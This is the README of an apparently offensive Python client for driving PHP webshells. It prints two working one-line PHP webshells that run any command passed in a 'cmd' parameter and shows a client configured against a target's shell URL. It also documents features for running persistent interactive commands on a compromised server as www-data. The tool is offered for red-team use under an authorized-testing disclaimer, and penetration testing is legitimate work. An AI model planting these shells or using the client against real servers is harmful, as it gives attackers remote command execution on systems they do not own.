# PHP WebShell Client

A lightweight Python CLI to interact with minimal PHP `?cmd=` webshells.  
Designed to keep the server-side payload extremely small while providing a comfortable, robust client-side interface.

## ✨ Features
- **Kali-style interactive prompt** (user-only label, `#` when `uid=0`).
- **Tab completion** with remote directory caching and smart invalidation.
- **Command history navigation** (↑ / ↓) via native `readline` (without duplicates).
- **TTY Protection:** Automatically intercepts interactive commands (`su`, `ssh`, `nano`, `top`, etc.) client-side to prevent hanging the webshell.
- **Compatible with *both* minimal PHP shells** (see below).
- **Robust output parsing** with markers (independent of any HTML the server may add).
- **Reliable Identity Detection:** Accurately detects current user (`id` / `whoami` / `$USER`) for prompt display without relying on complex bash variables.
- Uses `requests.Session()` with retries and timeouts.
- **AUTO transport:** tries POST first and falls back to GET if needed (you can force one).

## ✅ Minimal server-side shells (compatible)

### 1) Minimal with `$_REQUEST` (and `<pre>` wrapper) — classic
```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### 2) Ultra-minimal with `$_GET` only
```php
<?php system($_GET['cmd']); ?>
```
> This one **only** accepts GET. The client’s **AUTO** mode detects it and retries with GET when no markers are found in the POST response.

## 🚀 Quick start

1) **Edit configuration** in `RemoteAccess.py` (or your file name):
```python
URL = "https://target.tld/path/shell.php"

# Transport:
#   "auto" -> try POST, fallback to GET (recommended)
#   "post" -> force POST
#   "get"  -> force GET (use when your shell is like: <?php system($_GET['cmd']); ?>)
TRANSPORT = "auto"
```

2) **Install dependency** and run:
```bash
pip3 install requests
python3 RemoteAccess.py
```

3) **Example session**
```text
Cliente interactivo para WebShell PHP (Ctrl+C para salir)
┌──(www-data)-[/var/www]
└─$ pwd
/var/www
┌──(www-data)-[/var/www]
└─$ ls -la
...
┌──(www-data)-[/var/www]
└─$ whoami
www-data
```

## ⚙️ How it works (high level)
- **Stateless Emulation:** HTTP is inherently stateless. The client emulates a stateful shell by tracking your current working directory (`cwd`) client-side and wrapping your commands with a safe `cd` before execution.
- **Marker Parsing:** Output is parsed at **byte** level using wrappers (`__WBSTART__`, `__WBEND__`, `__WBRC__`) to avoid HTML interference and capture exact exit codes.
- **Directory Caching:** Directory listings for tab-completion are cached for a few seconds and automatically invalidated after FS-mutating commands (`rm`, `mkdir`, `mv`, etc.).
- **TTY Constraints:** Commands that require a real interactive TTY (like `su` or `vim`) will normally hang a webshell. The script detects these and blocks them client-side, showing a warning instead.

## 🧩 Options (excerpt)
- `TRANSPORT = "auto" | "post" | "get"` — transport selection.
- `VERIFY_TLS = True` — enable/disable TLS verification if you’re using self-signed certs.
- `REMOTE_CMD_TIMEOUT` — uses `timeout` on the remote host when available.

## 🛠 Requirements
- Python 3.8+
- `requests`

(Optional) Create a `requirements.txt`:
```txt
requests
```

## ⚠️ Legal / Disclaimer
This project is for **authorized security testing and education only**.  
Do **not** use it without explicit permission from the system owner.  
The author assumes no responsibility for misuse or damage.

---
Made with ❤️ for red teamers and security researchers.
